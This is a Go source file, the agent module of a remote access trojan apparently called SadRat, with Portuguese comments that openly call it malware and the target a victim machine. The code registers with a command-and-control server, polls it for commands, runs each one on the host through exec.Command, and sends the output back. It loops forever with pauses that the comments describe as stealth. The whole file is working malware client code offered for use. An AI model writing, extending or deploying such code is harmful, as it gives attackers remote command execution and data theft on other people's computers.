package agent

import (
	"bytes"
	"encoding/json"
	"errors"
	"net/http"
	"os/exec"
	"log"
	"time"
	"github.com/VitorDie/SadRat/internal/domain"
	"github.com/VitorDie/SadRat/internal/dto"
)

// AgentHTTP é o módulo cliente do nosso Malware
type AgentHTTP struct {
	serverURL  string
	httpClient *http.Client
}

// NewAgentHTTP cria uma nova instância do Agente zumbi
func NewAgentHTTP(serverURL string) *AgentHTTP {
	return &AgentHTTP{
		serverURL: serverURL,
		// Regra de Ouro: Sempre usar timeout para evitar que o malware trave a thread!
		httpClient: &http.Client{Timeout: 10 * time.Second},
	}
}

// type Job struct {
// 	ID      string   `json:"id"`
// 	Command string   `json:"command"`
// 	Args    []string `json:"args"`
// }

// RequestAnUUIDToMe bate na porta do C&C pedindo uma identidade
func (a *AgentHTTP) RequestAnUUIDToMe() (string, error) {
	// 1. Monta a URL da rota que já construímos no Servidor
	url := a.serverURL + "/api/agents"

	// 2. Prepara a requisição POST (o corpo pode ser vazio)
	req, err := http.NewRequest(http.MethodPost, url, bytes.NewBuffer([]byte{}))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/json")

	// 3. O Agente executa o disparo para a rede
	resp, err := a.httpClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	// 4. Se o servidor não responder com 201 Created (ou 200 OK), algo deu errado
	if resp.StatusCode != http.StatusCreated && resp.StatusCode != http.StatusOK {
		return "", errors.New("falha ao registrar o agente no C&C, status: " + resp.Status)
	}

	// 5. Lemos a resposta JSON enviada pelo nosso C&C
	var result map[string]string
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "", err
	}

	// 6. Extraímos o UUID gerado
	uuid, ok := result["uuid"]
	if !ok {
		return "", errors.New("o C&C não retornou um UUID válido")
	}

	return uuid, nil
}

// RequestJob faz o Long Polling perguntando ao C&C: "Mestre, o que devo fazer?"
func (a *AgentHTTP) RequestJob(agentID string) (domain.JobEntity, error) {
	url := a.serverURL + "/api/agents/" + agentID + "/job"

	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return domain.JobEntity{}, err
	}

	resp, err := a.httpClient.Do(req)
	if err != nil {
		return domain.JobEntity{}, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return domain.JobEntity{}, errors.New("nenhum comando recebido ou falha no servidor")
	}

	// 1. Lemos o DTO da rede
	var jobDTO dto.JobUsedByAgentDTO
	if err := json.NewDecoder(resp.Body).Decode(&jobDTO); err != nil {
		return domain.JobEntity{}, err
	}

	// 2. MAPEAMENTO: Convertemos DTO para Entidade de Domínio
	pureJob := domain.JobEntity{
		ID:      jobDTO.ID,
		Command: jobDTO.Command,
		Args:    jobDTO.Args,
	}

	// 3. Retornamos a entidade limpa!
	return pureJob, nil
}

// ExecuteJob invoca o SO para rodar o comando (agora recebe a Entidade Pura!)
func (a *AgentHTTP) ExecuteJob(job domain.JobEntity) (string, error) {
	// Como a entidade possui a mesma estrutura útil, a lógica do OS não muda
	cmd := exec.Command(job.Command, job.Args...)

	output, err := cmd.CombinedOutput()
	
	if err != nil {
		return string(output) + "\n" + err.Error(), err
	}

	return string(output), nil
}

func (a *AgentHTTP) SendJobResult(jobID string, output string) error {
	// 1. Monta a URL da rota de resultados do Operador
	url := a.serverURL + "/api/jobs/result"

	// 2. Prepara o DTO (JSON) exatamente como o Servidor espera receber
	payload := map[string]string{
		"job_id": jobID,
		"output": output,
	}
	
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	// 3. Prepara a requisição POST com o JSON embutido
	req, err := http.NewRequest(http.MethodPost, url, bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")

	// 4. O Agente dispara a requisição para o C&C relatando o sucesso
	resp, err := a.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// 5. Valida se o servidor processou e aceitou o relatório
	if resp.StatusCode != http.StatusOK {
		return errors.New("falha ao enviar resultado para o C&C, status: " + resp.Status)
	}

	return nil
}

func (a *AgentHTTP) Run() error {
	log.Println("[AGENT] Iniciando processo de infecção...")

	// 1. REGISTRO
	agentID, err := a.RequestAnUUIDToMe()
	if err != nil {
		log.Printf("[AGENT] Falha fatal ao registrar no C&C: %v\n", err)
		return err
	}
	log.Printf("[AGENT] Registrado com sucesso! UUID: %s\n", agentID)

	// 2. LONG POLLING (Loop Infinito)
	// Como no livro Black Hat Rust, criamos um loop infinito com pausas 
	// para não consumir 100% da CPU da máquina vítima.
	for {
		// A. Pede ordens ao C&C
		job, err := a.RequestJob(agentID)
		if err != nil {
			// Se der erro de rede, apenas dorme e tenta de novo depois
			time.Sleep(2 * time.Second)
			continue
		}

		// Se o ID do Job for vazio, significa que o C&C disse: "Não tem comandos"
		if job.ID == "" {
			time.Sleep(2 * time.Second)
			continue
		}

		log.Printf("[AGENT] Comando recebido: %s\n", job.Command)

		// B. Executa a ordem letal
		output, err := a.ExecuteJob(job)
		if err != nil {
			// Se o comando falhar no SO alvo, o output será a mensagem de erro
			output = err.Error() 
		}

		// C. Devolve o resultado (Exfiltração)
		err = a.SendJobResult(job.ID, output)
		if err != nil {
			log.Printf("[AGENT] Falha ao enviar resultado para o C&C: %v\n", err)
		}

		// Pausa antes do próximo ciclo para ser furtivo
		time.Sleep(1 * time.Second)
	}
}
